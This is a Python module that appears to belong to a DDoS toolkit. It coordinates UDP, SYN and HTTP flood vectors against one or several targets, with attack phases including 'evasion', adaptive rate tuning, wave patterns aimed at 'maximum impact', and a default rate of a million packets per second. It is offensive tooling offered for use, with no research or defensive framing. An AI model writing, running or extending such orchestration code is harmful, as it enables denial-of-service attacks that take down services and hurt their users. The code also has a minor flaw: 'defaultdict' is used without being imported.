"""
Advanced Attack Orchestrator

World-class attack orchestration system combining:
- Multi-vector attack coordination
- Real-time adaptive intelligence
- Distributed attack synchronization
- AI-driven attack optimization
- Dynamic resource allocation
"""

import asyncio
import time
import logging
import threading
import multiprocessing
from typing import Dict, List, Optional, Any, Callable, Tuple
from dataclasses import dataclass, field
from enum import Enum, auto
from collections import deque
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import queue

logger = logging.getLogger(__name__)


class AttackPhase(Enum):
    """Attack execution phases"""
    RECONNAISSANCE = auto()
    PROBING = auto()
    ESCALATION = auto()
    SUSTAINED = auto()
    EVASION = auto()
    TERMINATION = auto()


class VectorType(Enum):
    """Attack vector types"""
    VOLUMETRIC = auto()      # UDP/ICMP floods
    PROTOCOL = auto()        # SYN/ACK/RST floods
    APPLICATION = auto()     # HTTP/HTTPS/DNS
    AMPLIFICATION = auto()   # DNS/NTP/SSDP amplification
    SLOWLORIS = auto()       # Connection exhaustion
    HYBRID = auto()          # Multi-vector combination


@dataclass
class AttackVector:
    """Individual attack vector configuration"""
    name: str
    vector_type: VectorType
    protocol: str
    target: str
    port: int
    rate_pps: int = 10000
    packet_size: int = 1472
    threads: int = 4
    duration: int = 60
    enabled: bool = True
    weight: float = 1.0  # Relative importance
    evasion_level: int = 0
    custom_payload: Optional[bytes] = None


@dataclass
class OrchestratorConfig:
    """Orchestrator configuration"""
    target: str
    port: int
    vectors: List[AttackVector] = field(default_factory=list)
    total_rate_pps: int = 1000000
    duration: int = 300
    phases: List[AttackPhase] = field(default_factory=lambda: [
        AttackPhase.PROBING,
        AttackPhase.ESCALATION,
        AttackPhase.SUSTAINED
    ])
    adaptive_mode: bool = True
    ai_optimization: bool = True
    distributed: bool = False
    max_threads: int = 64
    max_processes: int = 8


@dataclass
class OrchestratorStats:
    """Orchestrator statistics"""
    total_packets: int = 0
    total_bytes: int = 0
    packets_by_vector: Dict[str, int] = field(default_factory=dict)
    current_phase: AttackPhase = AttackPhase.PROBING
    phase_start_time: float = 0.0
    target_response_time_ms: float = 0.0
    target_error_rate: float = 0.0
    effectiveness_score: float = 0.0
    start_time: float = 0.0
    
    @property
    def duration(self) -> float:
        return time.time() - self.start_time if self.start_time else 0.0
    
    @property
    def total_pps(self) -> float:
        return self.total_packets / self.duration if self.duration > 0 else 0.0
    
    @property
    def total_mbps(self) -> float:
        return (self.total_bytes * 8 / 1_000_000) / self.duration if self.duration > 0 else 0.0


class VectorEngine:
    """Engine for executing individual attack vectors"""
    
    def __init__(self, vector: AttackVector):
        self.vector = vector
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._stats = {'packets': 0, 'bytes': 0, 'errors': 0}
        self._engine = None
    
    def start(self):
        """Start the vector engine"""
        if self._running:
            return
        
        self._running = True
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
    
    def stop(self):
        """Stop the vector engine"""
        self._running = False
        if self._thread:
            self._thread.join(timeout=2.0)
    
    def _run(self):
        """Main execution loop"""
        try:
            # Import engine based on vector type
            from core.performance.ultra_engine import UltraEngine, UltraConfig, EngineMode
            
            config = UltraConfig(
                target=self.vector.target,
                port=self.vector.port,
                protocol=self.vector.protocol,
                threads=self.vector.threads,
                packet_size=self.vector.packet_size,
                rate_limit=self.vector.rate_pps,
                mode=EngineMode.HYBRID
            )
            
            self._engine = UltraEngine(config)
            self._engine.start()
            
            while self._running:
                stats = self._engine.get_stats()
                self._stats['packets'] = stats.packets_sent
                self._stats['bytes'] = stats.bytes_sent
                time.sleep(0.1)
            
            self._engine.stop()
            
        except Exception as e:
            logger.error(f"Vector engine error: {e}")
            self._stats['errors'] += 1
    
    def get_stats(self) -> Dict[str, int]:
        return self._stats.copy()
    
    def set_rate(self, rate_pps: int):
        """Dynamically adjust rate"""
        self.vector.rate_pps = rate_pps
        if self._engine:
            try:
                self._engine.config.rate_limit = rate_pps
            except Exception:
                pass


class PhaseController:
    """Controls attack phase transitions"""
    
    def __init__(self, config: OrchestratorConfig):
        self.config = config
        self.current_phase = AttackPhase.PROBING
        self.phase_index = 0
        self.phase_start_time = time.time()
        self.phase_durations = {
            AttackPhase.RECONNAISSANCE: 30,
            AttackPhase.PROBING: 60,
            AttackPhase.ESCALATION: 120,
            AttackPhase.SUSTAINED: 0,  # Until end
            AttackPhase.EVASION: 60,
            AttackPhase.TERMINATION: 10
        }
    
    def get_current_phase(self) -> AttackPhase:
        return self.current_phase
    
    def should_transition(self, stats: OrchestratorStats) -> bool:
        """Check if phase transition is needed"""
        elapsed = time.time() - self.phase_start_time
        phase_duration = self.phase_durations.get(self.current_phase, 60)
        
        # Sustained phase runs until end
        if self.current_phase == AttackPhase.SUSTAINED:
            return False
        
        return elapsed >= phase_duration
    
    def transition(self) -> AttackPhase:
        """Transition to next phase"""
        self.phase_index += 1
        if self.phase_index < len(self.config.phases):
            self.current_phase = self.config.phases[self.phase_index]
        else:
            self.current_phase = AttackPhase.TERMINATION
        
        self.phase_start_time = time.time()
        logger.info(f"Transitioned to phase: {self.current_phase.name}")
        return self.current_phase
    
    def get_phase_multiplier(self) -> float:
        """Get rate multiplier for current phase"""
        multipliers = {
            AttackPhase.RECONNAISSANCE: 0.1,
            AttackPhase.PROBING: 0.3,
            AttackPhase.ESCALATION: 0.7,
            AttackPhase.SUSTAINED: 1.0,
            AttackPhase.EVASION: 0.5,
            AttackPhase.TERMINATION: 0.1
        }
        return multipliers.get(self.current_phase, 1.0)


class AdaptiveController:
    """AI-driven adaptive attack controller"""
    
    def __init__(self, config: OrchestratorConfig):
        self.config = config
        self.history = deque(maxlen=1000)
        self.learning_rate = 0.1
        self.target_effectiveness = 0.8
        self._optimizer = None
    
    def analyze(self, stats: OrchestratorStats) -> Dict[str, Any]:
        """Analyze current attack effectiveness"""
        self.history.append({
            'timestamp': time.time(),
            'pps': stats.total_pps,
            'response_time': stats.target_response_time_ms,
            'error_rate': stats.target_error_rate,
            'effectiveness': stats.effectiveness_score
        })
        
        # Calculate trends
        if len(self.history) < 10:
            return {'action': 'maintain', 'confidence': 0.5}
        
        recent = list(self.history)[-10:]
        effectiveness_trend = (recent[-1]['effectiveness'] - recent[0]['effectiveness']) / 10
        
        if effectiveness_trend > 0.01:
            return {'action': 'escalate', 'confidence': 0.7, 'factor': 1.2}
        elif effectiveness_trend < -0.01:
            return {'action': 'adapt', 'confidence': 0.7, 'factor': 0.8}
        else:
            return {'action': 'maintain', 'confidence': 0.8}
    
    def get_vector_adjustments(self, vectors: List[AttackVector], stats: OrchestratorStats) -> Dict[str, float]:
        """Get rate adjustments for each vector"""
        adjustments = {}
        analysis = self.analyze(stats)
        
        for vector in vectors:
            if not vector.enabled:
                continue
            
            # Base adjustment from analysis
            factor = analysis.get('factor', 1.0)
            
            # Weight by vector effectiveness
            vector_stats = stats.packets_by_vector.get(vector.name, 0)
            if vector_stats > 0:
                vector_effectiveness = vector_stats / max(stats.total_packets, 1)
                factor *= (1 + vector_effectiveness * 0.2)
            
            adjustments[vector.name] = factor
        
        return adjustments


class AttackOrchestrator:
    """
    World-class attack orchestration system.
    
    Coordinates multiple attack vectors with:
    - Phase-based attack progression
    - AI-driven adaptive optimization
    - Real-time effectiveness monitoring
    - Dynamic resource allocation
    """
    
    def __init__(self, config: OrchestratorConfig):
        self.config = config
        self.stats = OrchestratorStats()
        self._running = False
        self._vector_engines: Dict[str, VectorEngine] = {}
        self._phase_controller = PhaseController(config)
        self._adaptive_controller = AdaptiveController(config)
        self._monitor_thread: Optional[threading.Thread] = None
        self._executor = ThreadPoolExecutor(max_workers=config.max_threads)
    
    def add_vector(self, vector: AttackVector):
        """Add attack vector"""
        self.config.vectors.append(vector)
    
    def remove_vector(self, name: str):
        """Remove attack vector"""
        self.config.vectors = [v for v in self.config.vectors if v.name != name]
        if name in self._vector_engines:
            self._vector_engines[name].stop()
            del self._vector_engines[name]
    
    def start(self):
        """Start orchestrated attack"""
        if self._running:
            return
        
        self._running = True
        self.stats = OrchestratorStats()
        self.stats.start_time = time.time()
        self.stats.current_phase = self._phase_controller.get_current_phase()
        
        # Initialize default vectors if none specified
        if not self.config.vectors:
            self._create_default_vectors()
        
        # Start vector engines
        for vector in self.config.vectors:
            if vector.enabled:
                engine = VectorEngine(vector)
                self._vector_engines[vector.name] = engine
                engine.start()
        
        # Start monitoring thread
        self._monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._monitor_thread.start()
        
        logger.info(f"Orchestrator started with {len(self._vector_engines)} vectors")
    
    def stop(self):
        """Stop orchestrated attack"""
        self._running = False
        
        # Stop all vector engines
        for engine in self._vector_engines.values():
            engine.stop()
        self._vector_engines.clear()
        
        if self._monitor_thread:
            self._monitor_thread.join(timeout=2.0)
        
        logger.info(f"Orchestrator stopped. Total: {self.stats.total_packets} packets, {self.stats.total_mbps:.2f} Mbps")
    
    def _create_default_vectors(self):
        """Create default attack vectors"""
        # UDP flood
        self.config.vectors.append(AttackVector(
            name='udp_flood',
            vector_type=VectorType.VOLUMETRIC,
            protocol='udp',
            target=self.config.target,
            port=self.config.port,
            rate_pps=self.config.total_rate_pps // 2,
            weight=1.0
        ))
        
        # TCP SYN flood
        self.config.vectors.append(AttackVector(
            name='tcp_syn',
            vector_type=VectorType.PROTOCOL,
            protocol='tcp',
            target=self.config.target,
            port=self.config.port,
            rate_pps=self.config.total_rate_pps // 4,
            weight=0.8
        ))
        
        # HTTP flood
        self.config.vectors.append(AttackVector(
            name='http_flood',
            vector_type=VectorType.APPLICATION,
            protocol='http',
            target=self.config.target,
            port=self.config.port,
            rate_pps=self.config.total_rate_pps // 4,
            weight=0.6
        ))
    
    def _monitor_loop(self):
        """Main monitoring and adaptation loop"""
        while self._running:
            try:
                # Collect stats from all vectors
                total_packets = 0
                total_bytes = 0
                
                for name, engine in self._vector_engines.items():
                    vector_stats = engine.get_stats()
                    self.stats.packets_by_vector[name] = vector_stats['packets']
                    total_packets += vector_stats['packets']
                    total_bytes += vector_stats['bytes']
                
                self.stats.total_packets = total_packets
                self.stats.total_bytes = total_bytes
                
                # Check phase transition
                if self._phase_controller.should_transition(self.stats):
                    new_phase = self._phase_controller.transition()
                    self.stats.current_phase = new_phase
                    self._apply_phase_adjustments()
                
                # Adaptive adjustments
                if self.config.adaptive_mode:
                    adjustments = self._adaptive_controller.get_vector_adjustments(
                        self.config.vectors, self.stats
                    )
                    self._apply_rate_adjustments(adjustments)
                
                time.sleep(1.0)
                
            except Exception as e:
                logger.error(f"Monitor loop error: {e}")
                time.sleep(1.0)
    
    def _apply_phase_adjustments(self):
        """Apply rate adjustments based on current phase"""
        multiplier = self._phase_controller.get_phase_multiplier()
        
        for vector in self.config.vectors:
            if vector.name in self._vector_engines:
                new_rate = int(vector.rate_pps * multiplier)
                self._vector_engines[vector.name].set_rate(new_rate)
    
    def _apply_rate_adjustments(self, adjustments: Dict[str, float]):
        """Apply adaptive rate adjustments"""
        for name, factor in adjustments.items():
            if name in self._vector_engines:
                vector = next((v for v in self.config.vectors if v.name == name), None)
                if vector:
                    new_rate = int(vector.rate_pps * factor)
                    self._vector_engines[name].set_rate(new_rate)
    
    def get_stats(self) -> OrchestratorStats:
        """Get current statistics"""
        return self.stats
    
    def get_status(self) -> Dict[str, Any]:
        """Get detailed status"""
        return {
            'running': self._running,
            'phase': self.stats.current_phase.name,
            'duration': self.stats.duration,
            'total_pps': self.stats.total_pps,
            'total_mbps': self.stats.total_mbps,
            'vectors': {
                name: engine.get_stats()
                for name, engine in self._vector_engines.items()
            }
        }


class MultiTargetOrchestrator:
    """Orchestrate attacks against multiple targets"""
    
    def __init__(self):
        self.orchestrators: Dict[str, AttackOrchestrator] = {}
        self._running = False
    
    def add_target(self, target: str, port: int, config: Optional[OrchestratorConfig] = None):
        """Add target to orchestration"""
        if config is None:
            config = OrchestratorConfig(target=target, port=port)
        self.orchestrators[f"{target}:{port}"] = AttackOrchestrator(config)
    
    def start_all(self):
        """Start all orchestrators"""
        self._running = True
        for orchestrator in self.orchestrators.values():
            orchestrator.start()
    
    def stop_all(self):
        """Stop all orchestrators"""
        self._running = False
        for orchestrator in self.orchestrators.values():
            orchestrator.stop()
    
    def get_combined_stats(self) -> Dict[str, Any]:
        """Get combined statistics"""
        total_pps = 0
        total_mbps = 0
        by_target = {}
        
        for key, orchestrator in self.orchestrators.items():
            stats = orchestrator.get_stats()
            total_pps += stats.total_pps
            total_mbps += stats.total_mbps
            by_target[key] = {
                'pps': stats.total_pps,
                'mbps': stats.total_mbps,
                'phase': stats.current_phase.name
            }
        
        return {
            'total_pps': total_pps,
            'total_mbps': total_mbps,
            'by_target': by_target
        }


# Convenience functions
def create_orchestrator(
    target: str,
    port: int,
    rate_pps: int = 1000000,
    duration: int = 300,
    adaptive: bool = True
) -> AttackOrchestrator:
    """Create orchestrator with optimal settings"""
    config = OrchestratorConfig(
        target=target,
        port=port,
        total_rate_pps=rate_pps,
        duration=duration,
        adaptive_mode=adaptive
    )
    return AttackOrchestrator(config)


class IntelligentVectorSelector:
    """AI-driven attack vector selection and optimization"""
    
    def __init__(self):
        self.vector_performance: Dict[str, List[float]] = defaultdict(list)
        self.vector_weights: Dict[str, float] = {}
        self.exploration_rate = 0.2
        self.learning_rate = 0.1
    
    def record_performance(self, vector_name: str, effectiveness: float):
        """Record vector performance for learning"""
        self.vector_performance[vector_name].append(effectiveness)
        
        # Keep only recent performance
        if len(self.vector_performance[vector_name]) > 100:
            self.vector_performance[vector_name] = self.vector_performance[vector_name][-100:]
        
        # Update weights
        self._update_weights()
    
    def _update_weights(self):
        """Update vector weights based on performance"""
        for vector_name, performances in self.vector_performance.items():
            if len(performances) >= 5:
                avg_performance = sum(performances[-10:]) / len(performances[-10:])
                
                if vector_name in self.vector_weights:
                    # Exponential moving average
                    self.vector_weights[vector_name] = (
                        self.learning_rate * avg_performance + 
                        (1 - self.learning_rate) * self.vector_weights[vector_name]
                    )
                else:
                    self.vector_weights[vector_name] = avg_performance
    
    def select_vectors(self, available_vectors: List[AttackVector], 
                      count: int = 3) -> List[AttackVector]:
        """Select optimal vectors based on learned weights"""
        import random
        
        if not available_vectors:
            return []
        
        # Exploration: randomly select some vectors
        if random.random() < self.exploration_rate:
            return random.sample(available_vectors, min(count, len(available_vectors)))
        
        # Exploitation: select based on weights
        scored_vectors = []
        for vector in available_vectors:
            weight = self.vector_weights.get(vector.name, 0.5)
            scored_vectors.append((vector, weight))
        
        # Sort by weight and select top
        scored_vectors.sort(key=lambda x: x[1], reverse=True)
        return [v for v, _ in scored_vectors[:count]]
    
    def get_vector_recommendations(self) -> Dict[str, Any]:
        """Get vector selection recommendations"""
        sorted_vectors = sorted(
            self.vector_weights.items(), 
            key=lambda x: x[1], 
            reverse=True
        )
        
        return {
            'top_vectors': sorted_vectors[:5],
            'underperforming': [v for v, w in sorted_vectors if w < 0.3],
            'exploration_rate': self.exploration_rate
        }


class DynamicResourceAllocator:
    """Dynamically allocate resources across attack vectors"""
    
    def __init__(self, total_rate_pps: int = 1000000, total_threads: int = 64):
        self.total_rate_pps = total_rate_pps
        self.total_threads = total_threads
        self.allocations: Dict[str, Dict[str, int]] = {}
        self.performance_history: Dict[str, List[float]] = defaultdict(list)
    
    def allocate(self, vectors: List[AttackVector], 
                effectiveness_scores: Dict[str, float]) -> Dict[str, Dict[str, int]]:
        """Allocate resources based on effectiveness"""
        if not vectors:
            return {}
        
        # Calculate total weight
        total_weight = sum(
            effectiveness_scores.get(v.name, 0.5) * v.weight 
            for v in vectors
        )
        
        if total_weight == 0:
            total_weight = len(vectors)
        
        allocations = {}
        remaining_rate = self.total_rate_pps
        remaining_threads = self.total_threads
        
        for i, vector in enumerate(vectors):
            weight = effectiveness_scores.get(vector.name, 0.5) * vector.weight
            proportion = weight / total_weight
            
            # Last vector gets remaining resources
            if i == len(vectors) - 1:
                rate = remaining_rate
                threads = remaining_threads
            else:
                rate = int(self.total_rate_pps * proportion)
                threads = max(1, int(self.total_threads * proportion))
                remaining_rate -= rate
                remaining_threads -= threads
            
            allocations[vector.name] = {
                'rate_pps': max(1000, rate),
                'threads': max(1, threads),
                'proportion': proportion
            }
        
        self.allocations = allocations
        return allocations
    
    def rebalance(self, performance_delta: Dict[str, float]):
        """Rebalance allocations based on performance changes"""
        for vector_name, delta in performance_delta.items():
            if vector_name in self.allocations:
                # Increase allocation for improving vectors
                current = self.allocations[vector_name]
                factor = 1.0 + (delta * 0.2)  # 20% adjustment per unit delta
                
                current['rate_pps'] = int(current['rate_pps'] * factor)
                current['threads'] = max(1, int(current['threads'] * factor))
        
        # Normalize to stay within limits
        self._normalize_allocations()
    
    def _normalize_allocations(self):
        """Normalize allocations to stay within resource limits"""
        total_rate = sum(a['rate_pps'] for a in self.allocations.values())
        total_threads = sum(a['threads'] for a in self.allocations.values())
        
        if total_rate > self.total_rate_pps:
            factor = self.total_rate_pps / total_rate
            for alloc in self.allocations.values():
                alloc['rate_pps'] = int(alloc['rate_pps'] * factor)
        
        if total_threads > self.total_threads:
            factor = self.total_threads / total_threads
            for alloc in self.allocations.values():
                alloc['threads'] = max(1, int(alloc['threads'] * factor))


class AttackWaveController:
    """Control attack waves for maximum impact"""
    
    def __init__(self):
        self.wave_patterns = {
            'constant': self._constant_wave,
            'pulse': self._pulse_wave,
            'ramp': self._ramp_wave,
            'sawtooth': self._sawtooth_wave,
            'random': self._random_wave
        }
        self.current_pattern = 'constant'
        self.wave_period = 30.0  # seconds
        self.wave_amplitude = 0.5  # 0-1, proportion of rate variation
        self.wave_start_time = time.time()
    
    def _constant_wave(self, t: float) -> float:
        return 1.0
    
    def _pulse_wave(self, t: float) -> float:
        import math
        phase = (t % self.wave_period) / self.wave_period
        return 1.0 if phase < 0.5 else (1.0 - self.wave_amplitude)
    
    def _ramp_wave(self, t: float) -> float:
        phase = (t % self.wave_period) / self.wave_period
        return (1.0 - self.wave_amplitude) + (self.wave_amplitude * phase)
    
    def _sawtooth_wave(self, t: float) -> float:
        import math
        phase = (t % self.wave_period) / self.wave_period
        return (1.0 - self.wave_amplitude) + (self.wave_amplitude * abs(2 * phase - 1))
    
    def _random_wave(self, t: float) -> float:
        import random
        return (1.0 - self.wave_amplitude) + (self.wave_amplitude * random.random())
    
    def get_multiplier(self) -> float:
        """Get current wave multiplier"""
        t = time.time() - self.wave_start_time
        return self.wave_patterns[self.current_pattern](t)
    
    def set_pattern(self, pattern: str, period: float = 30.0, amplitude: float = 0.5):
        """Set wave pattern"""
        if pattern in self.wave_patterns:
            self.current_pattern = pattern
            self.wave_period = period
            self.wave_amplitude = max(0, min(1, amplitude))
            self.wave_start_time = time.time()


class EnhancedAttackOrchestrator(AttackOrchestrator):
    """
    Enhanced attack orchestrator with advanced AI-driven capabilities.
    
    Features:
    - Intelligent vector selection
    - Dynamic resource allocation
    - Attack wave patterns
    - Real-time adaptation
    """
    
    def __init__(self, config: OrchestratorConfig):
        super().__init__(config)
        
        # Enhanced components
        self._vector_selector = IntelligentVectorSelector()
        self._resource_allocator = DynamicResourceAllocator(
            config.total_rate_pps, config.max_threads
        )
        self._wave_controller = AttackWaveController()
        
        # Enhanced state
        self._effectiveness_scores: Dict[str, float] = {}
        self._adaptation_interval = 5.0  # seconds
        self._last_adaptation = 0.0
    
    def _monitor_loop(self):
        """Enhanced monitoring loop with AI-driven adaptation"""
        while self._running:
            try:
                # Collect stats from all vectors
                total_packets = 0
                total_bytes = 0
                
                for name, engine in self._vector_engines.items():
                    vector_stats = engine.get_stats()
                    self.stats.packets_by_vector[name] = vector_stats['packets']
                    total_packets += vector_stats['packets']
                    total_bytes += vector_stats['bytes']
                    
                    # Calculate effectiveness for this vector
                    if self.stats.duration > 0:
                        pps = vector_stats['packets'] / self.stats.duration
                        error_rate = vector_stats['errors'] / max(1, vector_stats['packets'])
                        effectiveness = min(1.0, pps / 100000) * (1 - error_rate)
                        self._effectiveness_scores[name] = effectiveness
                        self._vector_selector.record_performance(name, effectiveness)
                
                self.stats.total_packets = total_packets
                self.stats.total_bytes = total_bytes
                
                # Check phase transition
                if self._phase_controller.should_transition(self.stats):
                    new_phase = self._phase_controller.transition()
                    self.stats.current_phase = new_phase
                    self._apply_phase_adjustments()
                
                # Apply wave pattern
                wave_multiplier = self._wave_controller.get_multiplier()
                
                # Periodic adaptation
                now = time.time()
                if now - self._last_adaptation >= self._adaptation_interval:
                    self._adapt_strategy()
                    self._last_adaptation = now
                
                # Apply rate adjustments with wave
                if self.config.adaptive_mode:
                    adjustments = self._adaptive_controller.get_vector_adjustments(
                        self.config.vectors, self.stats
                    )
                    for name, factor in adjustments.items():
                        adjustments[name] = factor * wave_multiplier
                    self._apply_rate_adjustments(adjustments)
                
                time.sleep(1.0)
                
            except Exception as e:
                logger.error(f"Enhanced monitor loop error: {e}")
                time.sleep(1.0)
    
    def _adapt_strategy(self):
        """Adapt attack strategy based on learned performance"""
        # Reallocate resources based on effectiveness
        allocations = self._resource_allocator.allocate(
            self.config.vectors,
            self._effectiveness_scores
        )
        
        # Apply new allocations
        for vector in self.config.vectors:
            if vector.name in allocations:
                alloc = allocations[vector.name]
                vector.rate_pps = alloc['rate_pps']
                vector.threads = alloc['threads']
                
                if vector.name in self._vector_engines:
                    self._vector_engines[vector.name].set_rate(alloc['rate_pps'])
        
        logger.debug(f"Strategy adapted: {allocations}")
    
    def set_wave_pattern(self, pattern: str, period: float = 30.0, amplitude: float = 0.5):
        """Set attack wave pattern"""
        self._wave_controller.set_pattern(pattern, period, amplitude)
        logger.info(f"Wave pattern set: {pattern}, period={period}s, amplitude={amplitude}")
    
    def get_enhanced_status(self) -> Dict[str, Any]:
        """Get enhanced status with AI insights"""
        base_status = self.get_status()
        
        base_status.update({
            'effectiveness_scores': self._effectiveness_scores.copy(),
            'vector_recommendations': self._vector_selector.get_vector_recommendations(),
            'resource_allocations': self._resource_allocator.allocations.copy(),
            'wave_pattern': self._wave_controller.current_pattern,
            'wave_multiplier': self._wave_controller.get_multiplier()
        })
        
        return base_status


__all__ = [
    'AttackPhase', 'VectorType', 'AttackVector',
    'OrchestratorConfig', 'OrchestratorStats',
    'VectorEngine', 'PhaseController', 'AdaptiveController',
    'AttackOrchestrator', 'MultiTargetOrchestrator',
    'create_orchestrator',
    'IntelligentVectorSelector', 'DynamicResourceAllocator',
    'AttackWaveController', 'EnhancedAttackOrchestrator'
]
